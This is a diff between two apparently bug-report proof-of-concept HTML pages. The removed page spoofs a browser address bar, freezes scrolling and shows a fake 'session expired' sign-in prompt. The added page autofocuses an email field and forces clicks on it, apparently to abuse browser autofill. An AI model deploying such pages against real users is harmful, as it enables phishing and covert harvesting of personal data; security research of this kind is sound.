@@ -1,90 +1,46 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Proof of Concept</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<style>
-  /* CSS sama persis, tidak ada yang berubah */
-  body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
-  #fake-omnibar {
-    position: fixed; top: 0; left: 0; width: 100%; height: 56px;
-    background-image: url('omnibar.png');
-    background-size: cover; z-index: 9999; display: none;
-  }
-  #initial-content { padding: 20px; height: 120vh; }
-  #trap-zone {
-    display: none; justify-content: center; align-items: center;
-    min-height: 100vh; box-sizing: border-box; background-color: #f0f2f5;
-  }
-  .prompt-container {
-    width: 100%; max-width: 450px; padding: 36px 40px;
-    border: 1px solid #dadce0; border-radius: 8px;
-    box-sizing: border-box; background-color: #fff; text-align: center;
-  }
-  .prompt-container h1 { font-size: 24px; font-weight: 400; margin-bottom: 16px; }
-  .prompt-container p { color: #5f6368; margin-bottom: 32px; }
-  .action-button {
-    padding: 10px 24px; border: none; border-radius: 4px;
-    font-size: 16px; font-weight: 500; cursor: pointer;
-    background-color: #1a73e8; color: white; width: 100%;
-  }
-  #success-message { display: none; color: #188038; }
-</style>
-</head>
-<body>
 
-<div id="fake-omnibar"></div>
-<div id="initial-content"><h1>Please Scroll Down</h1></div>
-<div id="trap-zone">
-    <div class="prompt-container">
-        <div id="login-prompt">
-            <h1>Your session has expired</h1>
-            <p>For your security, please sign in again to continue.</p>
-            <button class="action-button" onclick="showSuccess()">Continue to Sign In</button>
-        </div>
-        <div id="success-message">
-            <h1>Login Successful</h1><p>Redirecting you securely...</p>
-        </div>
-    </div>
-</div>
 
-<script>
-  const trapZone = document.getElementById('trap-zone');
-  const fakeOmnibar = document.getElementById('fake-omnibar');
-  let hasScrolled = false;
+<html style=""><head></head>
 
-  function showSuccess() {
-    document.getElementById('login-prompt').style.display = 'none';
-    document.getElementById('success-message').style.display = 'block';
-  }
+<body onload="myFunction()">
+<div >
 
-  function freezeScreen(e) {
-    e.preventDefault();
-  }
+<input autofocus="autofocus" id="x" autocomplete="email" style="margin-top: 8%;
+width: 100px;
+margin-left: 70%">
 
-  const observer = new IntersectionObserver((entries) => {
-    if (entries[0].isIntersecting) {
-      console.log("TRAP TRIGGERED!");
-      fakeOmnibar.style.display = 'block';
-      
-      document.body.addEventListener('wheel', freezeScreen, { passive: false });
-      document.body.addEventListener('touchmove', freezeScreen, { passive: false });
-      
-      observer.disconnect();
-    }
-  });
+  </body>
+  </html>
   
-  window.addEventListener('scroll', () => {
-    if (hasScrolled) return;
-    hasScrolled = true;
-    setTimeout(() => {
-      trapZone.style.display = 'flex';
-      trapZone.scrollIntoView();
-    }, 1000);
-  }, { once: true });
+  
+  
+  
+ </html>
+ 
+ <script>
+ setTimeout(fcs,100);
+ 
+ function fcs()
+ {
+   document.getElementById("x").focus();
+ }
 
-  observer.observe(trapZone);
-</script>
 
-</body>
-</html>
+document.addEventListener("click", myFunction);
+ 
+function myFunction()
+{
+document.getElementById("x").click();
+
+}
+
+
+ function spoof(){
+ 
+  document.getElementById("x").click();
+ 
+ }
+ 
+ 
+ 
+ </script>
